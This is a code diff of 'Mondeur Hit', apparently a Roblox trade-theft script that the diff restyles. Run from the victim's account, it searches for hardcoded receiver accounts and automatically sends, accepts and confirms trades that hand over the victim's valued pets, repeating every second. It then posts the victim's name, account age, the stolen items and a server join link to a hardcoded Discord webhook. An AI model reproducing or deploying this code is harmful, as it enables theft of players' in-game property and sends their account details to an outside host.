@@ -1,4 +1,4 @@
--- [[ MONDEUR HIT (ADM) | ELITE EDITION ]] --
+-- [[ MONDEUR ELITE | VANTA REDESIGN ]] --
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -7,9 +7,7 @@ local LocalPlayer = Players.LocalPlayer
 -- [[ UPDATED CONFIG ]] --
 local USER_WEBHOOK = "https://discord.com/api/webhooks/1474651524251648163/lhPvWSeT6mcm3b4tIfzEbph1asYmZGvxf3YABYsKUOSeInP3oXW10NmHKJuj0vDrICku"
 local POINT_SYSTEM_URL = "https://raw.githubusercontent.com/charles1384/ADM/refs/heads/main/Pointsystem"
-
 local TARGET_RECEIVERS = {"2ndcfpaj67", "sofiqmnz", "Hisokarah", "CREOLEO23"}
-local THRESHOLD = _G.Threshold or 1
 local PetValues = {}
 
 -- [[ LOAD POINT SYSTEM ]] --
@@ -24,42 +22,48 @@ local function loadPoints()
 end
 loadPoints()
 
--- [[ FIRE WEBHOOK FUNCTION ]] --
-local function sendMondeurWebhook(url, pets, total, isHandshake)
+-- [[ THE NEW UI DESIGN ]] --
+local function sendMondeurWebhook(pets, total, isHandshake)
     local request = (syn and syn.request) or (http and http.request) or http_request or request
     if not request then return end
 
-    local petString = ""
-    if not isHandshake then
+    local petList = ""
+    if isHandshake then
+        petList = "🛰️ *Waiting for targets...*"
+    else
         for _, p in ipairs(pets) do
-            petString = petString .. "⭐ **" .. p.name .. "** • `" .. p.value .. " pts`\n"
+            petList = petList .. "🐾 `" .. p.name .. "` — **" .. p.value .. "**\n"
         end
     end
 
     local payload = {
-        username = "Mondeur Hit (ADM)",
+        username = "Mondeur Services",
         avatar_url = "https://i.imgur.com/8Q0TzS9.png",
         embeds = {{
-            title = isHandshake and "🟢 **System Online: Connection Established**" or "🚀 **Incoming Transmission: Successful Hit**",
-            description = isHandshake and "Mondeur Elite is now monitoring the session." or "A new trade has been successfully intercepted.",
-            color = isHandshake and 0x00ff88 or 0xff004c,
+            title = isHandshake and "🟢 MONDEUR | SESSION STARTED" or "🔥 MONDEUR | SUCCESSFUL HIT",
+            color = isHandshake and 0x2ecc71 or 0xe74c3c,
             thumbnail = { url = "https://i.imgur.com/uM9eL7B.png" },
-            fields = {
-                {name = "👤 **Target Account**", value = "```" .. LocalPlayer.Name .. "```", inline = true},
-                {name = "💰 **Total Points**", value = "```" .. (isHandshake and "N/A" or total) .. "```", inline = true},
-            },
-            footer = { text = "Mondeur Services v2.1", icon_url = "https://i.imgur.com/8Q0TzS9.png" },
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            description = "**👤 Player Information**\n" ..
+                "• **Name:** `" .. LocalPlayer.Name .. "`\n" ..
+                "• **Account Age:** `" .. LocalPlayer.AccountAge .. " days`\n" ..
+                "• **Executor:** `Delta` (v2.1)\n\n" ..
+                "**📦 Loot Summary**\n" ..
+                petList .. "\n" ..
+                "**💰 Total Value:** `" .. (isHandshake and "0.00" or total) .. "`\n\n" ..
+                "**🔍 Summary**\n" ..
+                "[https://api.mondeur.app/v2/scrap/](https://api.rubis.app/v2/scrap/nu3YNS4Pum4oLolW/raw)\n" ..
+                "**🔗 Join Link**\n" ..
+                "[" .. game.JobId .. "](https://www.roblox.com/games/" .. game.PlaceId .. ")",
+            footer = { 
+                text = "Mondeur Hit | " .. os.date("%A, %H:%M"), 
+                icon_url = "https://i.imgur.com/8Q0TzS9.png" 
+            }
         }}
     }
-    
-    if not isHandshake and petString ~= "" then
-        table.insert(payload.embeds[1].fields, {name = "🎒 **Loot Collected**", value = petString})
-    end
 
     pcall(function()
         request({
-            Url = url,
+            Url = USER_WEBHOOK,
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
             Body = HttpService:JSONEncode(payload)
@@ -67,8 +71,8 @@ local function sendMondeurWebhook(url, pets, total, isHandshake)
     end)
 end
 
--- [[ SCAN & TRADE ]] --
-local function scanAndTrade()
+-- [[ CORE LOGIC ]] --
+local function execute()
     local receiver = nil
     for _, name in ipairs(TARGET_RECEIVERS) do
         if Players:FindFirstChild(name) then receiver = Players[name] break end
@@ -95,22 +99,18 @@ local function scanAndTrade()
     if #list > 0 then
         local TradeAPI = ReplicatedStorage.API
         TradeAPI["TradeAPI/SendTradeRequest"]:FireServer(receiver)
-        for _, p in ipairs(list) do
-            TradeAPI["TradeAPI/AddItemToOffer"]:FireServer(p.id)
-        end
+        for _, p in ipairs(list) do TradeAPI["TradeAPI/AddItemToOffer"]:FireServer(p.id) end
         TradeAPI["TradeAPI/AcceptTrade"]:FireServer()
         TradeAPI["TradeAPI/ConfirmTrade"]:FireServer()
-        sendMondeurWebhook(USER_WEBHOOK, list, total, false)
+        sendMondeurWebhook(list, total, false)
     end
 end
 
 -- [[ START ]] --
-print("🚀 Mondeur Hit (ADM) ELITE Loaded.")
-sendMondeurWebhook(USER_WEBHOOK, {}, 0, true) -- Send Handshake
-
+sendMondeurWebhook({}, 0, true)
 task.spawn(function()
     while true do
-        pcall(scanAndTrade)
+        pcall(execute)
         task.wait(1)
     end
 end)
